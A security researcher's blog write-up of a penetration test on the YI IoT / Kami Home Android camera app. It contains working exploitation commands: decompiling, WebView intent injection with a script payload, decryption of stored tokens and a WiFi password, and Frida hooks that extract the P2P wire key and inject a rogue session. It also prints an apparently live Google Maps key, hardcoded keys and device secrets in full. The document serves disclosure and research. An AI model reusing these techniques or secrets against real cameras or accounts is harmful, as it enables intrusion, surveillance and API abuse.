---
title: "Hacking a Cloud IP Camera Full Android Teardown of the YI IoT / Kami Home App"
date: 2026-09-02
draft: false
tags: ["android", "iot-security", "reverse-engineering", "yi-iot", "kami-home"]
---

![Hacking a Cloud IP Camera — YI IoT / Kami Home Android Teardown](header.jpeg)

## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#setup)
3. [Static Analysis: The First Pass](#static-analysis--the-first-pass)
4. [Breaking the "Encrypted" Preferences](#breaking-the-encrypted-preferences)
5. [Traffic Interception: TLS Without Hostname Verification](#traffic-interception--tls-without-hostname-verification)
6. [The Login "Password" That Isn't a Password](#the-login-password-that-isnt-a-password)
7. [Alert Media: Client-Side Paywall and ECB Encryption](#alert-media--client-side-paywall-and-ecb-encryption)
8. [Hunting the P2P Stack: The TUTK Kalay Dead End](#hunting-the-p2p-stack--the-tutk-kalay-dead-end)
9. [Sniffing the Wire: PPPP Ground Truth](#sniffing-the-wire--pppp-ground-truth)
10. [Reversing the Wire Authentication](#reversing-the-wire-authentication)
11. [Injecting a Rogue P2P Session: The Full Saga](#injecting-a-rogue-p2p-session--the-full-saga)
12. [The Verdict: What Worked and What Didn't](#the-verdict--what-worked-and-what-didnt)
13. [Findings Summary](#findings-summary)
14. [Thoughts: App Security vs EU/US Standards and Regulations](#thoughts--app-security-vs-euus-standards-and-regulations)



## Introduction

IP cameras occupy a special place in consumer IoT: they sit inside people's homes, they see and hear everything, and almost all of them are built around the same architecture a cheap SoC, a cloud backend for accounts and relay, and a P2P stack so the mobile app can punch through NAT and watch live video from anywhere. When that chain is weak anywhere, the result isn't a data breach of email addresses it's strangers watching your living room.

This post is the writeup of the **Android application phase** of penetration test against the **YI IoT / Kami Home** ecosystem (`com.yunyi.smartcamera`, the app that drives YI and Kami-branded cloud cameras, part of the Xiaomi ecosystem). The test device was my own camera (UID `TNPXGAR-583857-XXXXX`).

The goal of this phase was deliberately **remote-attacker focused**: not "what can a rogue app on the same phone do" (that class of local-only testing is well covered by commodity mobile scanners), but the questions that actually matter for a device operating in EU and US homes *can someone on the network intercept the account? Can someone who gets the app binary extract secrets that work against the cloud? Can someone talk to the camera's P2P protocol directly and pull video?*

Spoiler: the answer to the first two is a resounding **yes**, demonstrated end-to-end. The third one produced the most interesting engineering of the whole phase a full reverse of the wire authentication, a working raw P2P session, and an honest negative result that tells you something real about how this camera defends itself.

All PoC scripts referenced below are published in the companion repository:

> **PoC repository:** `https://github.com/mikias1943/yi-exploit-scripts/`

## Setup

The lab is nothing exotic, and every tool is standard:

- **Device under test:** rooted OnePlus 5T (A5010, LineageOS 13, Magisk). Root matters because two of the best findings live in data-at-rest and in live memory instrumentation.
- **Instrumentation:** `frida-server` 16.7.0 pushed to the device and run as root; Frida client on a Mac. Spawn mode turned out to be broken for this app (it dies on early startup paths), so **everything was done in attach mode** attach to the running process, then navigate the app.
- **Proxying:** Burp Suite on the Mac, phone on the same LAN with a manual HTTP proxy. As you'll see, no certificate-pinning bypass was needed the app *helpfully* disables TLS hostname verification itself.
- **Traffic capture:** a phone-hosted WiFi hotspot so the camera's own traffic could be observed, plus Burp for the app's HTTPS.
- **Static analysis:** the app ships as an APKMirror `.apkm` bundle (split APKs); `base.apk` is the main module:

```bash
apktool d base.apk -o apktool_out          # resources, manifest, smali
jadx -d jadx_out base.apk                  # multi-dex Java decompile
unzip -o split_config.arm64_v8a.apk 'lib/*' -d native_libs   # native .so libraries
apksigner verify --print-certs base.apk    # cert SHA-1 matches google-services.json -> genuine Play build
```

The camera: a YI/Kami cloud camera running firmware `6.0.05.10_202211081332`, bound to test **Account A** (`userid 16166865`), with a second sacrificial **Account B** (`userid 16194022`) created for cross-account tests in the cloud phase.

## Static Analysis: The First Pass

The first pass over the decompiled app (manifest, `network_security_config.xml`, assets, grep-driven review of the jadx output, native library strings) produced six confirmed findings before the app was ever run. A companion grep dump of the binary (`endpoints.txt`, 1,119 lines) also mapped the entire host surface production, staging, and legacy which later became the cloud-phase scope. The headline items:

- **Over-privileged permissions:** `READ_LOGS`, `QUERY_ALL_PACKAGES`, `REPLACE_EXISTING_PACKAGE`, `CALL_PHONE` far beyond what a camera viewer needs.
- **FileProvider exposes the filesystem root:** `res/xml/file_paths.xml` contains `<root-path name="root" path=""/>` a share-everything primitive waiting for a reachable consumer.
- **Staging/test hosts shipped in the production binary:** `sh-test-h5.xiaoyi.com` (a cleartext-HTTP mirror of the payment H5), `test-api-us.xiaoyi.com`, `gw-test.xiaoyi.com`, `test-yiiot.kamihome.com`.
- **Hardcoded third-party secrets in `assets/ShareSDK.xml`:** Facebook, WeChat, Weibo, QQ, Twitter several of them *live*, verified from Cloud Shell. The Facebook app secret still operates the Graph API **as the "YI Home" application**:

```bash
curl -s "https://graph.facebook.com/v19.0/15751XXXXXX?access_token=157XXXXX&fields=id,name,category,link"
{"id":"1575139842724297","name":"YI Home","category":"Lifestyle",
 "link":"https://kamihome.prod.kamicloud.net/", ...}
```

And the WeChat AppSecret mints working access tokens with no IP whitelist:

```bash
curl -s "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=wx3bXXX&secret=04d5XXXX"
# -> {"access_token":"107_Uc3Q...","expires_in":7200}
```

- **Unrestricted Google Maps API key** (`AIzaSyDAgXuIIZgOMNC7zjbattZVbyII1NpnPT4`, hardcoded twice in the Manifest). A sweep with [`api_key_sweep.sh`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/api_key_sweep.sh) confirmed **7 paid APIs wide open** geocode, places, timezone, elevation, streetview, staticmap, geolocation quota theft / denial-of-wallet territory:

```
[geocode]        -> OK
[places]         -> OK
[timezone]       -> OK
[elevation]      -> OK
[streetview]     -> OK
[staticmap]      -> WORKS (image returned)
[geolocation]    -> OK  (POST /geolocation/v1/geolocate returned coordinates)
[directions]     -> REQUEST_DENIED
[roads]          -> PERMISSION_DENIED
[distancematrix] -> REQUEST_DENIED
```

- **Exported `WebViewActivity`** handling the `yunyi://` scheme with no URL validation and JavaScript enabled confirmed dynamically:

```bash
adb shell am start -a android.intent.action.VIEW -d "yunyi://https://www.baidu.com" com.yunyi.smartcamera
# -> arbitrary site loaded inside the app's WebView
adb shell "am start ... -d 'yunyi:data:text/html,<script>alert(document.domain)</script>'"
# -> JavaScript executed, alert popup fired
```
![Burp capture of the YI cloud API](URL_OPEN.png)
![Burp capture of the YI cloud API](JS_ENABLED_ALERT.png)

Any installed app can render attacker-controlled content inside the YI app's chrome a convincing phishing surface for camera-account credentials.

Not everything was broken: the **Firebase project is correctly locked down** (signup disabled, RTDB denies anonymous reads), the **Aliyun OSS buckets deny anonymous access**, and the OSS presigning correctly happens server-side (the AccessKey secret is not in the binary). The Twitter secret was revoked. Those go in the "positive notes" column.

## Breaking the "Encrypted" Preferences

The single highest impact app side finding. The app stores its session in "encrypted" SharedPreferences (`profileV2.xml`) using AES/CBC/PKCS5Padding. That sounds fine until you read how the key and IV are made (`com/xiaoyi/base/util/c0.java`, `p.java`):

```java
// c0.java — PreferenceUtil
public final IvParameterSpec n() {
    byte[] bArr = new byte[this.f85694a.getBlockSize()];
    System.arraycopy("gcQu4mcDjQkPjcX1YY2X6xNaWyiWF0dUNbA".getBytes(), 0, bArr, 0, 16); // STATIC IV
    return new IvParameterSpec(bArr);
}
public final SecretKeySpec q() {
    return new SecretKeySpec(d(p.c()), "AES/CBC/PKCS5Padding");   // key = SHA-256(p.c())
}

// p.java — DeviceUtil
public static String c() { return b() + "default"; }
public static String b() {
    String str = "35"
        + (Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) + 1
        + (Build.DEVICE.length() % 10) + (Build.DISPLAY.length() % 10)
        + (Build.HOST.length() % 10) + (Build.ID.length() % 10)
        + (Build.MANUFACTURER.length() % 10) + (Build.MODEL.length() % 10)
        + (Build.PRODUCT.length() % 10) + (Build.TAGS.length() % 10)
        + (Build.TYPE.length() % 10) + (Build.USER.length() % 10);
    ...
}
```

Every single input to the key is a **public device build property** `adb shell getprop` gives you all of it. Zero user entropy, zero RNG, no Android Keystore. Anyone who knows the device model's public fingerprint recomputes the AES key. (There's even a bug where the code tries to stash the raw key material base64'd in a plaintext `origin.xml` next to the encrypted data defeated only by a second bug, `Base64.decode(...).toString()` producing `[B@hash`, which also silently corrupts stored prefs between sessions.)

Pulling the prefs from the rooted device and decrypting offline with [`decrypt_profileV2.py`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/decrypt_profileV2.py):

```bash
adb shell "su -c 'cp -r /data/data/com.yunyi.smartcamera/shared_prefs /sdcard/yi_data/'"
adb pull /sdcard/yi_data
python3 decrypt_profileV2.py profileV2.xml
```

```
key material : 357719348739994default
AES-256 key  : ad71822ec68c250fd08015c220172f11292f3538c6ffa2d388efcac1909cf0b1
static IV    : gcQu4mcDjQkPjcX1
[+] decrypted: 147   undecryptable: 0
```

**147 of 147 values recovered**, including:

| Key | Decrypted value |
|---|---|
| `TOKEN` | `a9cc8292990f1a0180175865fcd51669` |
| `TOKEN_SECRET` | `50ecca6a9ad20181efbf0264e5249b94` |
| `USER_EMAIL` | `xigac57080@archifun.com` |
| `USER_NAME` (account ID) | `16166865` |
| `OPEN_ID` | `a251d86cfdf41bfb633becb3f95bffbd` |
| **`WIFI_NAME_PWD_CU_yTTP`** | **`9mXXXXXXX`** the WiFi password |
| `LAST_CONNECT_BSSID` | `b0:97:XX:XX:XX:XX` |
| `TNP_SEV_PREFIX_<camera UID>` | 64-char P2P device secret |
| `CURRENT_VERSION<UID>` | firmware `6.0.05.10_202211081332` |

Read that table again. Theft of one XML file by malware, a rogue root app, an insecure backup, a device image yields the **live cloud session token pair** (which, as the next sections show, is the *entire* authentication model of the API) plus the user's **home WiFi credentials** as a network-pivot bonus. This is what "encryption" that exists to tick a box looks like.

## Traffic Interception: TLS Without Hostname Verification

The app talks HTTPS to its cloud gateways but its own HTTP client (`f2.c`, the AsyncHttpClient subclass that carries **every** `/v4`, `/v5`, `/v8` API call including login and tokens) builds its socket factory on an empty keystore and then does this:

```java
// c.java:54
MySSLSocketFactory.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
```

`ALLOW_ALL_HOSTNAME_VERIFIER` accepts any certificate for any host. Combined with the network security config:

```xml
<!-- res/xml/network_security_config.xml the ENTIRE policy -->
<base-config cleartextTrafficPermitted="true" />
```

and `android:usesCleartextTraffic="true"` in the manifest, there is no pinning, no hostname verification, and cleartext is welcome app-wide. Pointing the phone at Burp required **zero bypass tooling** install the Burp CA, set the proxy, done. The result: 523 captured requests across 5 hosts (`plt-gw-us`, `plt-api-us`, `touch-us`, `us-lb`, `h5.xiaoyi.com`), covering login, device lists, alert media, orders, and sharing.

<PICTURE_HERE>
![Burp capture of the YI cloud API](BURP_CAPTURE.png)

Three structural facts fell out of that capture, and they define the whole cloud attack surface:

**1. There is no session.** Every request authenticates with query parameters `userid` + `seq` + `hmac` (base64). No `Authorization` header, no session cookie (the only cookie is `SERVERID`, a load-balancer stickiness token).

**2. The hmac binds to (userid, seq) not to the request.** The signing scheme is `hmac = Base64(HMAC-SHA1(key = token + "&" + token_secret, data = sorted-params))`, and the signed params don't bind the path or body. The proof: one captured signature, `hmac=TCTO/AjATLvMkdYpXznM0sBX/Uc=` with `userid=16166865&seq=1`, was accepted on at least **six different endpoints** (`/v4/users/prop`, `/v4/devices/list`, `/v4/users/extinfo`, `/v5/deviceshare/invitee/invitations`, `/vas/v8/search/user_flag`, event tracking). A captured or computed signature is a reusable account-wide credential.

**3. The API hands out device secrets.** `GET /v4/devices/list` returned, in one response: the camera's **device password** (`6E429D5EB995E43CB504776F0013B3A8`), its UID and DID, the home WiFi SSID (`NETGEAR57`), MAC, LAN IP, and firmware version. `GET /v5/devices/password?uid=...&pincode=...` returns the device password directly, keyed on nothing but a `uid`. And `GET /v4/tnp/device_info?uid=...` returns the P2P `DID`, `License`, and `InitString` the material needed to address the camera over P2P at all. Whether these accept *another user's* identifiers is exactly what the cloud phase tests.

## The Login "Password" That Isn't a Password

One detail in the login traffic deserves its own section, because it's a design flaw that no amount of TLS will fix. The "password" sent to `GET /v4/users/login` (yes, credentials in a **GET query string** server logs, proxies, and Referer headers all capture them) is computed client-side as:

```java
// z5.java password transform
Base64(HmacSHA256(key = "KXLiUdAsO81ycDyEJAeETC$KklXdz3AC", password))
```

A **deterministic, unsalted HMAC with a hardcoded key** that ships in every copy of the app. Two properties make this nasty:

- It's a **password equivalent**: the server never sees anything else, so capturing or computing this blob is as good as knowing the password replay works forever, no cracking needed.
- It's **rainbow-table-able offline**: anyone can precompute blob password mappings for common passwords at zero cost per lookup.

And the empirical confirmation from the capture: two *different* accounts produced the **identical** blob `2HvIiuDlaluikN1e02Sq19lCRVPpwN0mnK9fyXQJBa0=` because both test accounts were created with the same password. Deterministic transform, no salt, no per-account anything. (Related hardening notes from the same review: a hardcoded default pincode HMAC salt `04b1aa5fb31e185f` in `s3.java`, and a hardcoded literal nonce `7aT8z8hJ` in the HTTP client.)

## Alert Media: Client-Side Paywall and ECB Encryption

The app's local database revealed where alert event media lives:

```bash
sqlite3 yi_data/databases/ants_yi_home.db "SELECT video_url FROM alert_info;"
http://motiondetection-us-1d.oss-us-west-1.aliyuncs.com/2026/08/27/16166865/TNPXGAR-583857-MEWJZ_<ts>_0.mp4?Expires=...&OSSAccessKeyId=LTAI5tBMbJvPGQkZeADXrDHH&Signature=...
```

Private camera alert videos transiting over **plain HTTP**, with presigned URLs embedding the `userid` and device `DID` in the path, valid for ~24 hours anyone on the same WiFi, a hostile hotspot, or the upstream path sees them. That's the cleartext finding (F-01) upgraded from "config smell" to "observed in production traffic."

But the media blobs are encrypted... sort of. Reverse-engineering the format and the key delivery produced [`decrypt_alert_media.py`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/decrypt_alert_media.py):

```
Format:  [0:4]  little-endian uint32 = plaintext length
         [4:]   AES-128-ECB(key = pic_pwd / video_pwd, raw ASCII) + zero-padding
```

Two design failures compound here. First, **AES-ECB** the mode that famously leaks structure (the ECB penguin) with the key used as raw ASCII. Second, and worse: **the decryption key is delivered by `/v2/alert/list` in the same response as the media URL** including to accounts whose `/v4/user/permissions` says `canViewAlert=false`. The cloud-storage paywall is enforced **client-side only**. The server hands you the ciphertext and the key in one envelope; the app just chooses not to show you the video if you haven't paid.

```bash
python3 decrypt_alert_media.py alert.jpg vnudhxbbc4f7x5zf
[+] alert.jpg -> alert.decrypted.jpg (18274 bytes, magic: ffd8ffe0)
```
![Burp capture of the YI cloud API](alert.decrypted.jpg)

The decrypted JPEG opens in any viewer proof of the full chain: intercept (or query) get URL + key decrypt offline. "Encryption" that travels with its own key is access-control theater; and access control enforced only in the client isn't access control at all.



## Hunting the P2P Stack: The TUTK Kalay Dead End

The native libraries told an interesting story before any dynamic work: this app ships **four** P2P stacks TUTK/Kalay (`libIOTCAPIs.so`, `libAVAPIs.so`), PPPP/CS2 (`libPPPP_API.so`), iLnkP2P, and Tencent IoT Video. TUTK Kalay is the one with the famous CVE family most notably **CVE-2021-28372** (UID-enumeration device hijack, CVSS 9.1-ish class), where knowing a device's 20-character UID is enough to register it to an attacker account because the IOTC `DID` is the sole device address.

So the obvious first move: build a Kalay device-login PoC ([`yi_kalay_device_login.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_kalay_device_login.js)), hook into the app, and check whether the IOTC stack is reachable with the camera's UID. The result was a dead end, but an instructive one:

```bash
grep -c "IOTC_Connect\|IOTC_Session" jadx_out/   # plenty of references in code
# ...but dynamically:
[sniff] hooks live open the camera live view now.
# (no IOTC module ever appears in Process.enumerateModules())
```

While live video streamed happily, `libIOTCAPIs.so` **never loaded** not in the main process, not in any sibling process. The Kalay stack is shipped dead code for this camera generation: present in the binary, referenced by the Java layer, but the firmware on this model speaks **PPPP/XP2P (CS2)** instead. The CVE-2021-28372-style test is *parked*, not closed it's a latent risk for other YI/Kami models that do load the TUTK libs, and the app still carries the code paths.

## Sniffing the Wire: PPPP Ground Truth

With Kalay ruled out, attention moved to `libPPPP_API.so` (API version `0xA2040101`). Before attacking anything, you need ground truth: what does the *real* app actually send to the camera? For that, [`yi_pppp_sniff.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_pppp_sniff.js) hooks `PPPP_Write`/`PPPP_Read` and dumps every byte, channel-tagged, while the live view runs.

One practical note that cost some time: **attach mode is the right way to run these scripts** the app must already be running and inside the live video view, so the PPPP library is loaded and the app's own `getPassword` calls are firing. Spawn mode was broken for this target; attaching to the running `Yi iot` process works:

```bash
frida-ps -U | grep -i yi
 7878  Yi iot

frida -U -p 7878 -l yi_pppp_sniff.js
     ____
    / _  |   Frida 16.7.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   Connected to ONEPLUS A5010 (id=13374439)
Attaching...
[sniff] hooking libPPPP_API.so @ 0x7854990000
[sniff] hooks live — open the camera live view now.
```

Opening live view immediately produced the exact startup sequence the ground truth everything else builds on (annotations mine):

```
[sniff] WRITE h=1 ch=0 len=56 :: 02030000000000301311000200000008436f354e...  <- 0x1311 SET_RESOLUTION,  payload 0000000100000001
[sniff] WRITE h=1 ch=0 len=52 :: 020300000000002c0330000300000004436f354e...  <- 0x0330 DEVINFO_REQ,     payload 00000000
[sniff] WRITE h=1 ch=0 len=52 :: 020300000000002c2345000400000004436f354e...  <- 0x2345 TNP_START_REALTIME, payload 02010100  <- THIS starts video
[sniff] WRITE h=1 ch=0 len=52 :: 020300000000002c139a000500000004436f354e...  <- 0x139a GET_WHITE_LIGHT_OFF_STATUS
[sniff] WRITE h=1 ch=0 len=72 :: 02030000000000402347000600000018436f354e...  <- 0x2347 TNP_EVENT_LIST_REQ (24-byte time payload — NOT a start command)
[sniff] WRITE h=1 ch=0 len=52 :: 020300000000002c1300000700000004436f354e...  <- 0x1300 UPDATE_CHECK_PHONE
[sniff] WRITE h=1 ch=0 len=52 :: 020300000000002c1406000800000004436f354e...  <- 0x1406 WATCH_COUNT
[sniff] READ  h=1 ch=0 len=48 :: 1312000200000008...                            <- SET_RESOLUTION response
[sniff] READ  h=1 ch=0 len=384 :: 0331000300000158...                           <- DEVINFO response (384B)
[sniff] READ  h=1 ch=3 len=1301 :: 004e0000000200020500...                      <- media frames, ch=3
[sniff] READ  h=1 ch=2 len=23812 :: 004e0100000200010500...                     <- media frames, ch=2 (23.8 KB — video)
```

The command IDs were pinned against the app's own `AVIOCTRLDEFs.java` (9029 = `TNP_START_REALTIME` = 0x2345, 9031 = `TNP_EVENT_LIST_REQ` = 0x2347, 5018 = 0x139a...). Two things here saved hours later: **0x2345 is the real start command** (4-byte payload `02010100`, 52-byte packet), and **0x2347 is not** it's an event-list request with a 24-byte time payload (72-byte packet). Confusing them sends a perfectly-formed packet that does nothing.

The packet anatomy, fully decoded from the hex:

```
TNPHead (8 bytes):        02 03 00 00 | u32 LE totalSize
TNPIOCtrlHead (40 bytes): u16 BE ioType | u16 BE cmdNum | u32 LE dataSize | 32-byte auth field
Payload:                  dataSize bytes
Auth field (32 bytes):    "<account>,<digest>" e.g. Co5Nfg5FyXFfh6k,wqSsZRciaBV9ZBj
```

## Reversing the Wire Authentication

That 32-byte auth field was the whole game. Every WRITE carried a fresh `account,digest` pair a 15-char account like `Co5Nfg5FyXFfh6k` and a 15-char digest. Decompiling the generator (`com.xiaoyi.camera.util.AntsUtil`) gave the complete scheme:

```java
// AntsUtil.java (com.xiaoyi.camera.util)
account  = noncePrefix(7 chars) + genNonce(8 chars)          // genNonce -> java.util.Random (NOT a CSPRNG)
password = Base64(HMAC-SHA1(key = realWirePwd,
                            msg = "user=xiaoyiuser&nonce=" + account))[0:15]
```

So: hardcoded literal username `xiaoyiuser`, a nonce from `java.util.Random`, and a truncated HMAC-SHA1 over `user=...&nonce=...`, keyed by a per-device **wire password**. The truncation to 15 base64 chars leaves ~90 bits fine in theory. The problem is everything *around* it: a non-CSPRNG nonce, and the small matter of where `realWirePwd` comes from.

A 20-minute Python check removed all doubt. Taking two `account,digest` pairs straight out of the sniff and recomputing the HMAC with the candidate key:

```python
import hmac, hashlib, base64

key = b"CooMxGNJGNSUbsE"                      # candidate wire key (see below)
for acct, expected in [("QdtIeyHJIO05582", "Wo3BVjDGpwr1G8f"),
                       ("Co5Nfg5FyXFfh6k", "wqSsZRciaBV9ZBj")]:
    digest = base64.b64encode(
        hmac.new(key, ("user=xiaoyiuser&nonce=" + acct).encode(), hashlib.sha1
    ).digest()).decode()[:15]
    print(acct, digest == expected)
```

```
QdtIeyHJIO05582 True
Co5Nfg5FyXFfh6k True
```

**Both sniffed digests reproduce exactly.** And where did the candidate key come from? A Frida hook on `AntsUtil.getPassword(nonce, realPwd)` the app computes the wire auth in Java, in memory, in plain text:

```
[final] CAPTURED real wire key: CooMxGNJGNSUbsE (len 15)
```

Note what this key is **not**: it's not the cloud-API device password (`6E429D5EB995E43CB504776F0013B3A8` recomputing with that and its variants produced all `False`). The wire key is a *separate* per-device secret the app receives/derives at runtime. The chain to it from the cloud side (`/v5/devices/password`, `/v4/tnp/device_info`) is precisely what makes the Tier-1 cloud targets interesting.

Also documented while in the neighborhood: media frame encryption is **AES/ECB/NoPadding** with key = `password + "0"` (`AESIPC.java`, `TnpCamera.java` `updatePasswordOnly`). ECB for video frames the same mode choice as the alert-media store. A pattern emerges.


## Injecting a Rogue P2P Session: The Full Saga

Now the actual question: **can a third party open its own PPPP session to the camera and pull video, without the app?** The attack script ([`yi_pppp_probe.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_pppp_probe.js) [`yi_pppp_attack.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_pppp_attack.js) [`yi_pppp_final.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_pppp_final.js)) calls `PPPP_Connect` with the public constants (UID + TNP server string + license key), then drives the camera over the raw handle. Getting there took four real bugs all worth documenting, because this is what protocol RE actually looks like:

**Bug 1: premature writes.** `PPPP_Connect` is *asynchronous*. Early runs connected fine (valid session handles returned) but every `PPPP_Write` failed with `-3005` / `-3034` and zero bytes came back. The official app revealed the answer in `TnpCamera.java:1654`: it polls `PPPP_Check(handle, st_PPPP_Session)` until the session is actually established before sending a single IOCTRL. Gate your writes on `PPPP_Check == 0` or you're shouting into a half-open tunnel.

**Bug 2: wrong hook class.** The first version of the auth hook targeted `com.ants360.yicamera.util.AntsUtil` (a guess from the legacy package name) and Frida answered with the classic:

```
Error: java.lang.ClassNotFoundException: Didn't find class "com.ants360.yicamera.util.AntsUtil"
```

The decompiled source's line 1 settles it: `package com.xiaoyi.camera.util;`. Trust the decompiler over your memory of legacy package names.

**Bug 3: the wrong "start" command.** One run sent a beautifully-formed 72-byte packet with valid auth and got silence because it was `0x2347 TNP_EVENT_LIST_REQ` (the 24-byte time-payload command), not `0x2345 TNP_START_REALTIME` (52 bytes, payload `02010100`). The sniff ground truth above is what caught it. This is why you sniff first.

**Bug 4 garbage auth tells you the gate exists.** An early probe sent `TNP_START_REALTIME` with a deliberately wrong auth field. Result: total silence no error frame, no NACK, nothing. The camera **enforces per-command authentication**: bad auth doesn't get rejected, it gets *ignored*. That's actually decent protocol hygiene (no oracle), and it set up the real experiment: the only variable left to prove was auth itself.

The final positive-control run ([`yi_pppp_final.js`](https://github.com/mikias1943/yi-exploit-scripts/blob/main/yi_pppp_final.js)) therefore: (1) hooks `getPassword` and captures the **real** wire key from the app's own calls, (2) opens a raw session using only public constants, (3) waits for `PPPP_Check` readiness, then (4) replays the app's exact startup sequence `SET_RESOLUTION DEVINFO_REQ TNP_START_REALTIME` with **valid per-command auth** computed by the app's own crypto code under fresh nonces:

```bash
frida -U -n "Yi iot" -l yi_pppp_final.js
```

```
[final] hook on AntsUtil.getPassword armed
[final] CAPTURED real wire key: CooMxGNJGNSUbsE (len 15)
[final] raw session handle = 5
[final] PPPP_Check ready after 0 ms
[final] >>> SET_RESOLUTION auth=PWNCTRL00000002,<digest> write -> 56
[final] >>> DEVINFO_REQ    auth=PWNCTRL00000003,<digest> write -> 52
[final] >>> START_REALTIME auth=PWNCTRL00000004,<digest> write -> 52
[final] ================ POSITIVE-CONTROL VERDICT ================
[final] video bytes: 0 | ch3 bytes: 0 | ctrl pkts: 0
[final] still no media - report honestly: raw-session start needs something more.
[final] session closed. P2P phase complete - paste this log.
```

## The Verdict: What Worked and What Didn't

**Proven:**
- A **raw PPPP session can be established from inside the app process using only public constants** UID, server string, license key. No stolen session, no race with the app.
- The camera **enforces per-command authentication** garbage auth produces total silence, not errors.
- The wire authentication is **fully reproducible offline** the HMAC scheme was verified bit-for-bit against sniffed traffic, and the per-device wire key is extractable from the app's memory with a two-line Frida hook (or, potentially, from the cloud API the Tier-1 cloud question).
- The exact startup packet sequence is documented and replayable byte-for-byte.

**Not achieved (and reported as such):**
- **No media or control bytes flowed on the injected session**, even with cryptographically valid per-command auth. The firmware does not start its media pipeline for the rogue session most likely the media channel is bound to a deeper handshake state (session-layer negotiation beyond the IOCTRL auth field, or the camera only services the session it initiated state for). Closing that gap means deeper firmware/protocol RE diminishing returns for this engagement.

So: no claim of unauthorized video access here. The honest security statement is narrower but still meaningful **the P2P wire protocol's confidentiality reduces entirely to the secrecy of one 15-character per-device key**, and that key is (a) held in plaintext by the app, (b) adjacent to API endpoints that hand out device passwords and P2P init material, and (c) used alongside a non-CSPRNG nonce and ECB frame encryption. Whether `/v5/devices/password` or `/v4/tnp/device_info` will yield *another account's* device secrets is the question that decides if this chain becomes a real remote camera-takeover and that is exactly where the cloud phase starts.

## Findings Summary

| ID | Finding | Severity |
|---|---|---|
| F-08a | "Encrypted" SharedPreferences: publicly-computable key + static IV live tokens, email, WiFi password recovered (147/147) | **High** |
| F-09/F-10 | Alert media: key delivered with URL in same API response; `canViewAlert=false` paywall enforced client-side only; AES-128-ECB | **High** |
| F-01 | Cleartext HTTP app-wide, no pinning, **TLS hostname verification disabled** (`ALLOW_ALL_HOSTNAME_VERIFIER`) full API MitM with zero bypass | **High** |
| F-11 | Login password = deterministic unsalted HMAC w/ hardcoded key replayable password-equivalent, rainbow-table-able; identical blobs across accounts confirmed | **High** |
| F-12 | API auth model: no session; hmac binds to (userid, seq) not to the request signature reusable across endpoints; all object IDs are BOLA/IDOR candidates | **High** (design) |
| F-13 | Cloud API returns device password, P2P DID/License/InitString (`/v4/devices/list`, `/v5/devices/password`, `/v4/tnp/device_info`) | **High** |
| F-06 | Exported WebView loads arbitrary URLs, JS enabled (`yunyi://` scheme) | Medium |
| F-14 | Wire protocol: non-CSPRNG nonce (`java.util.Random`), AES/ECB frame encryption, hardcoded `xiaoyiuser`; auth key = sole gate | Medium |
| F-15 | Staging/test hosts shipped in prod binary (cleartext HTTP payment mirror `sh-test-h5`, `test-api-us`, `test-yiiot`) | Medium |
| F-02 | Unrestricted Google Maps API key (7 paid APIs live) | Medium-Low |
| F-04 | Hardcoded Facebook app secret, live (act-as-app) | Low-Medium |
| F-05 | Hardcoded WeChat AppSecret, live (token minting, no IP whitelist) | Low-Medium |
| - | Latent: TUTK Kalay stack shipped (CVE-2021-28372 class) but never loaded by this model | Informational |
| - | Positive: Firebase locked down; OSS buckets deny anonymous; presigning server-side; Twitter secret dead | Informational |

## Thoughts: App Security vs EU/US Standards and Regulations

This product operates in EU and US homes, which means its design choices aren't just engineering debt they sit squarely inside several regulatory frames. A candid assessment:

**European Union.** Video of identifiable people, account emails, home WiFi credentials, and precise location are unambiguously **personal data** under the GDPR, and the household exemption doesn't cover the *vendor's* processing. Against the GDPR's own text, this app is exposed on multiple articles at once:

- **Art. 5(1)(f) & Art. 32 (integrity, confidentiality, state of the art):** cleartext HTTP for private alert videos, TLS hostname verification disabled, deterministic unsalted password transforms, AES-ECB for media, and session tokens recoverable with a publicly-computable key are each, individually, hard to reconcile with "state of the art" security of processing. Together they read as systemic.
- **Art. 25 (data protection by design and by default):** a client-side-only paywall that ships the decryption key to non-paying accounts, and an app that persists home WiFi passwords at all, are design-phase decisions exactly what Art. 25 exists to prevent.
- **Art. 33/34:** if any of these were exploited against real users, the notification clock (72h to the DPA; user notification for high-risk items like exposed camera footage) starts ticking.

Beyond GDPR, **ETSI EN 303 645** the European baseline for consumer IoT security, and the reference standard regulators point to is directly contravened: Provision 5.4-1 (sensitive security parameters stored securely) vs. F-08a's computable key and hardcoded secrets; Provision 5.5-1 (best-practice cryptography in transit) vs. cleartext media and ECB; Provision 5.1 (authentication sanity) vs. a hardcoded wire username and a 15-char device secret as the sole video gate. And looking forward, the **EU Cyber Resilience Act** (in force since Dec 2024, core obligations applying from Dec 2027) makes "products with digital elements" explicitly including connected cameras subject to security-by-design, vulnerability-handling, and incident-reporting duties with real teeth (fines up to 15M Euro or 2.5% of global turnover). Shipping known-broken crypto and disabled TLS checks in 2027 won't be a bad review; it will be non-compliance.

**United States.** There's no single IoT security statute, but the enforcement pattern is arguably more concrete:

- **FTC Act $5 (unfair or deceptive practices)** is the big one, and the precedents are *camera-specific*: the FTC sued **D-Link** (2017) over insecure cameras and routers, extracted a **$5.8M settlement from Ring** (2023) after employees and contractors accessed customer videos, and a **$2.95M settlement from Verkada** (2024) over security failures behind a 150,000-camera breach. A vendor shipping disabled TLS verification and client-side paywalls on home cameras in 2026 is writing its own complaint exhibits.
- **California SB-327** and **Oregon's connected-device law** require "reasonable security features" for connected devices sold in those states hardcoded keys and cleartext private video are the canonical examples of what those laws target.
- **NIST IR 8259 / 8425** (the federal IoT baseline and the profile behind the **FCC Cyber Trust Mark**) call for secure-by-default configuration, protected communications, and secure credential storage the same three pillars this app fails.

